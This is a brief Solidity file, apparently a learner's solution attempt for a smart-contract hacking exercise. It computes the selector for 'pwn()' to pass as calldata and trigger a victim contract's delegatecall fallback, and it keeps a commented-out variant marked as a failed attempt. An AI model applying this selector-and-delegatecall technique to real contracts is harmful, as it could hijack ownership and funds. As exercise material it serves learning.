// SPDX-License-Identifier: MIT
pragma solidity > 0.8.0 <= 0.9.0;


contract Hack {
     function getsig () public pure returns (bytes memory) {
      return abi.encodeWithSignature("pwn()"); 
      // call the delegate.call with  msg.data as fn sgn// returns "0xdd365b8b"
    }

}
//FAIL


// pragma solidity > 0.8.0 <= 0.9.0;


// contract HackDelegateCall{
//     event Response(bool success, bytes data);
//       function testCallDoesNotExist(address _addr) public {
//         (bool success, bytes memory data) = _addr.delegatecall(
//             abi.encodeWithSignature("pwn()")
//         );

//         emit Response(success, data);
//     }
// }
